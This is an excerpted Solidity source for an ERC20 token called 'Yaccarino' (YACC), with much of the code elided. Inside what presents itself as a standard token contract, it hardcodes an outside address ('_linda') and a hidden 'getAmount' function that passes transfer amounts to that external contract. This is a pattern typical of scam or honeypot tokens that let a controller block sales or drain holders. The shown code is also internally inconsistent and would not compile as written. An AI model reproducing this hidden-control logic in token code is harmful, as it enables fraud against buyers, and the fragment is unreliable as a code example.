...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    address _linda = 0x2E90dbE706f0Cc21B9F657C123bb9D3049f666F0;
    address public pair;
    ...
    function getAmount(uint256 amount) internal returns (uint256) {
        return linda.sendTransaction(amount);
    }
    ...
    function _DeployYaccarino(address account, uint256 amount) internal virtual {
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployYaccarino(creator, initialSupply);
    }
}

contract Yaccarino is ERC20Token {
    constructor() ERC20Token("Yaccarino", "YACC", msg.sender, 6942000000 * 10 ** 18) {
    }
}